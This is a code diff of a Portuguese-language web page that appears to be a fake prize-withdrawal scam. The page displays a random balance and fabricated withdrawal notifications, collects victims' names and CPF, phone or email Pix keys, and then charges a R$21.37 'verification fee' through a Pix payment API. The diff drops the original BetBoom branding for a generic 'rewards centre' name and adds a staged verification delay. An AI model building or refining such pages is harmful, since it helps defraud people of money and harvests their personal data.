     function validateWithdrawForm({ showAllErrors = false } = {}) {
       const nameIsValid = nameInput.value.trim().split(/\s+/).filter(Boolean).length >= 2;
       const pixValidation = getPixKeyValidation();
-      const betboomIdIsValid = betboomIdInput.value.replace(/\D/g, "").length === 8;
-      const formIsValid = nameIsValid && pixValidation.isValid && betboomIdIsValid;
+      const formIsValid = nameIsValid && pixValidation.isValid;
 
       setFieldState(
         nameInput,
         nameError,
         nameIsValid,
         "Preencha seu nome completo corretamente.",
-        showAllErrors || touchedWithdrawFields.name
+        showAllErrors || touchedFields.name
       );
       setFieldState(
         pixKeyInput,
         pixKeyError,
         pixValidation.isValid,
         pixValidation.message,
-        showAllErrors || touchedWithdrawFields.pixKey
-      );
-      setFieldState(
-        betboomIdInput,
-        betboomIdError,
-        betboomIdIsValid,
-        "Preencha o ID da sua conta corretamente.",
-        showAllErrors || touchedWithdrawFields.betboomId
+        showAllErrors || touchedFields.pixKey
       );
       requestWithdraw.disabled = !formIsValid;
-
       return formIsValid;
     }
 
-    function showScreen(screen) {
-      homeScreen.hidden = screen !== homeScreen;
-      withdrawScreen.hidden = screen !== withdrawScreen;
-      confirmScreen.hidden = screen !== confirmScreen;
-      window.scrollTo({ top: 0, behavior: "auto" });
-    }
-
-    setRandomBalance();
-
-    openWithdraw.addEventListener("click", () => {
-      showScreen(withdrawScreen);
-    });
-
-    backHome.addEventListener("click", () => {
-      showScreen(homeScreen);
-    });
-
-    backWithdraw.addEventListener("click", () => {
-      showScreen(withdrawScreen);
-    });
-
     function formatCpf(value) {
-      const digits = String(value).replace(/\D/g, "").slice(0, 11);
-      return digits
+      return String(value)
+        .replace(/\D/g, "")
+        .slice(0, 11)
         .replace(/(\d{3})(\d)/, "$1.$2")
         .replace(/(\d{3})(\d)/, "$1.$2")
         .replace(/(\d{3})(\d{1,2})$/, "$1-$2");
@@ -1580,14 +1509,11 @@
 
     function formatPhone(value) {
       const digits = String(value).replace(/\D/g, "").slice(0, 11);
-
-      if (digits.length <= 2) return digits;
-      if (digits.length <= 6) return digits.replace(/^(\d{2})(\d+)/, "($1) $2");
       if (digits.length <= 10) {
-        return digits.replace(/^(\d{2})(\d{4})(\d+)/, "($1) $2-$3");
+        return digits.replace(/(\d{2})(\d)/, "($1) $2").replace(/(\d{4})(\d)/, "$1-$2");
       }
 
-      return digits.replace(/^(\d{2})(\d{5})(\d+)/, "($1) $2-$3");
+      return digits.replace(/(\d{2})(\d)/, "($1) $2").replace(/(\d{5})(\d)/, "$1-$2");
     }
 
     function updatePixKeyField({ clear = false } = {}) {
@@ -1616,8 +1542,8 @@
         return;
       }
 
-      if (pixType !== "cpf") {
-        pixKeyInput.placeholder = "Cole sua chave aleatoria";
+      if (pixType === "aleatoria") {
+        pixKeyInput.placeholder = "Cole sua chave aleatória";
         pixKeyInput.inputMode = "text";
         pixKeyInput.removeAttribute("maxlength");
         return;
@@ -1627,84 +1553,6 @@
       pixKeyInput.inputMode = "numeric";
       pixKeyInput.maxLength = 14;
     }
-
-    pixTypeInput.addEventListener("change", () => {
-      updatePixKeyField({ clear: true });
-      touchedWithdrawFields.pixKey = false;
-      validateWithdrawForm();
-    });
-
-    nameInput.addEventListener("input", () => {
-      touchedWithdrawFields.name = true;
-      validateWithdrawForm();
-    });
-
-    pixKeyInput.addEventListener("input", () => {
-      touchedWithdrawFields.pixKey = true;
-
-      if (pixTypeInput.value === "cpf") {
-        pixKeyInput.value = formatCpf(pixKeyInput.value);
-      }
-
-      if (pixTypeInput.value === "telefone") {
-        pixKeyInput.value = formatPhone(pixKeyInput.value);
-      }
-
-      validateWithdrawForm();
-    });
-
-    updatePixKeyField();
-
-    function formatBetboomId(value) {
-      const digits = String(value).replace(/\D/g, "").slice(0, 8);
-      return digits.replace(/^(\d{2})(\d)/, "$1-$2");
-    }
-
-    betboomIdInput.addEventListener("input", () => {
-      touchedWithdrawFields.betboomId = true;
-      betboomIdInput.value = formatBetboomId(betboomIdInput.value);
-      validateWithdrawForm();
-    });
-
-    validateWithdrawForm();
-
-    function updateWithdrawalToast() {
-      toastIndex = (toastIndex + 1) % withdrawalToasts.length;
-      const nextToast = withdrawalToasts[toastIndex];
-
-      toast.style.animation = "none";
-      toast.offsetHeight;
-      toastAvatar.src = nextToast.avatar;
-      toastName.textContent = nextToast.name;
-      toastAmount.textContent = nextToast.amount;
-      toastTime.textContent = nextToast.time;
-      toast.style.animation = "";
-    }
-
-    window.setInterval(updateWithdrawalToast, 4200);
-
-    pixForm.addEventListener("submit", (event) => {
-      event.preventDefault();
-      if (!validateWithdrawForm({ showAllErrors: true })) {
-        return;
-      }
-
-      const formData = new FormData(pixForm);
-      const pixType = String(formData.get("pix-type") || "cpf");
-      const pixKey = String(formData.get("pix-key") || "").trim();
-      withdrawalData.name = String(formData.get("name") || "").trim();
-      withdrawalData.pixType = pixType;
-      withdrawalData.pixKey = pixKey;
-      withdrawalData.document = pixType === "cpf" ? pixKey.replace(/\D/g, "") : "";
-      withdrawalData.email = pixType === "email" ? pixKey : "";
-      withdrawalData.phone = pixType === "telefone" ? pixKey.replace(/\D/g, "") : "";
-      withdrawalData.betboomId = String(formData.get("betboom-id") || "").trim();
-      withdrawalData.checkoutKey = createCheckoutKey();
-      resetPixGeneration();
-      updateStepBanner();
-      startPaymentTimer();
-      showScreen(confirmScreen);
-    });
 
     function setPixStatus(message, type = "") {
       pixStatus.textContent = message;
@@ -1721,11 +1569,11 @@
 
       try {
         const parsed = JSON.parse(rawMessage);
-        return parsed.message || parsed.error || "Nao foi possivel gerar o Pix. Tente novamente.";
+        return parsed.message || parsed.error || "Não foi possível gerar o Pix. Tente novamente.";
       } catch {
         return rawMessage && !rawMessage.includes("{")
           ? rawMessage
-          : "Nao foi possivel gerar o Pix. Tente novamente.";
+          : "Não foi possível gerar o Pix. Tente novamente.";
       }
     }
 
@@ -1753,11 +1601,90 @@
       setGenerateError("");
     }
 
+    openWithdraw.addEventListener("click", () => {
+      showScreen(withdrawScreen);
+    });
+
+    backHome.addEventListener("click", () => {
+      showScreen(homeScreen);
+    });
+
+    backWithdraw.addEventListener("click", () => {
+      showScreen(withdrawScreen);
+    });
+
+    pixTypeInput.addEventListener("change", () => {
+      updatePixKeyField({ clear: true });
+      touchedFields.pixKey = false;
+      validateWithdrawForm();
+    });
+
+    nameInput.addEventListener("input", () => {
+      touchedFields.name = true;
+      validateWithdrawForm();
+    });
+
+    pixKeyInput.addEventListener("input", () => {
+      touchedFields.pixKey = true;
+
+      if (pixTypeInput.value === "cpf") {
+        pixKeyInput.value = formatCpf(pixKeyInput.value);
+      }
+
+      if (pixTypeInput.value === "telefone") {
+        pixKeyInput.value = formatPhone(pixKeyInput.value);
+      }
+
+      validateWithdrawForm();
+    });
+
+    pixForm.addEventListener("submit", (event) => {
+      event.preventDefault();
+
+      if (isSubmittingWithdraw) {
+        return;
+      }
+
+      if (!validateWithdrawForm({ showAllErrors: true })) {
+        return;
+      }
+
+      isSubmittingWithdraw = true;
+      requestWithdraw.disabled = true;
+
+      const formData = new FormData(pixForm);
+      const pixType = String(formData.get("pix-type") || "cpf");
+      const pixKey = String(formData.get("pix-key") || "").trim();
+
+      withdrawalData.name = String(formData.get("name") || "").trim();
+      withdrawalData.pixType = pixType;
+      withdrawalData.pixKey = pixKey;
+      withdrawalData.document = pixType === "cpf" ? pixKey.replace(/\D/g, "") : "";
+      withdrawalData.email = pixType === "email" ? pixKey : "";
+      withdrawalData.phone = pixType === "telefone" ? pixKey.replace(/\D/g, "") : "";
+      withdrawalData.checkoutKey = createCheckoutKey();
+
+      reviewName.textContent = withdrawalData.name;
+      reviewPix.textContent = pixKey;
+
+      resetPixGeneration();
+      updateStepBanner();
+      setLoadingMessage("Verificando dados...");
+      showScreen(loadingScreen);
+
+      window.setTimeout(() => {
+        startPaymentTimer();
+        showScreen(confirmScreen);
+        isSubmittingWithdraw = false;
+        validateWithdrawForm();
+      }, 1900);
+    });
+
     generatePix.addEventListener("click", async () => {
       if (isGeneratingPix) return;
 
       if (hasGeneratedPix && pixCode.value) {
-        setPixStatus("Pix ja gerado. Use o codigo exibido abaixo.", "success");
+        setPixStatus("Pix já gerado. Use o código exibido abaixo.", "success");
         return;
       }
 
@@ -1782,15 +1709,15 @@
             idempotencyKey: withdrawalData.checkoutKey,
             items: [
               {
-                title: "Contribuicao de seguranca reembolsavel",
+                title: "Taxa administrativa de verificação e processamento",
                 unitPrice: 21.37,
                 quantity: 1,
               },
             ],
             customer: {
-              name: withdrawalData.name || "Cliente BetBoom Premios",
+              name: withdrawalData.name || "Cliente Central de Recompensas",
               cpf: withdrawalData.document,
-              email: withdrawalData.email || "cliente@betboompremios.local",
+              email: withdrawalData.email || "cliente@central.local",
               phone: withdrawalData.phone || "21999999999",
             },
             delivery: {
@@ -1807,11 +1734,11 @@
         const data = await response.json();
 
         if (!response.ok) {
-          throw new Error(data.error || "Nao foi possivel gerar o Pix.");
+          throw new Error(data.error || "Não foi possível gerar o Pix.");
         }
 
         if (!data.pix_code) {
-          throw new Error("A API nao retornou o codigo Pix copia e cola.");
+          throw new Error("A API não retornou o código Pix copia e cola.");
         }
 
         pixCode.value = data.pix_code;
@@ -1824,7 +1751,7 @@
           pixQrWrap.classList.add("visible");
         }
 
-        setPixStatus("Pix gerado. Copie o codigo ou escaneie o QR Code.", "success");
+        setPixStatus("Pix gerado. Copie o código ou escaneie o QR Code.", "success");
       } catch (error) {
         setGenerateError(getFriendlyPixError(error));
       } finally {
@@ -1837,25 +1764,30 @@
 
     copyPix.addEventListener("click", async () => {
       if (!pixCode.value) {
-        setPixStatus("Gere o Pix antes de copiar o codigo.", "error");
+        setPixStatus("Gere o Pix antes de copiar o código.", "error");
         return;
       }
 
       try {
         await navigator.clipboard.writeText(pixCode.value);
         copyPix.classList.add("copied");
-        setPixStatus("Codigo Pix copiado com sucesso.", "success");
+        setPixStatus("Código Pix copiado com sucesso.", "success");
       } catch {
         pixCode.select();
         document.execCommand("copy");
         copyPix.classList.add("copied");
-        setPixStatus("Codigo Pix copiado.", "success");
+        setPixStatus("Código Pix copiado.", "success");
       }
 
       window.setTimeout(() => {
         copyPix.classList.remove("copied");
       }, 1600);
     });
+
+    setDisplayedBalance();
+    updatePixKeyField();
+    validateWithdrawForm();
+    window.setTimeout(() => showScreen(homeScreen), 1900);
   </script>
 </body>
 </html>
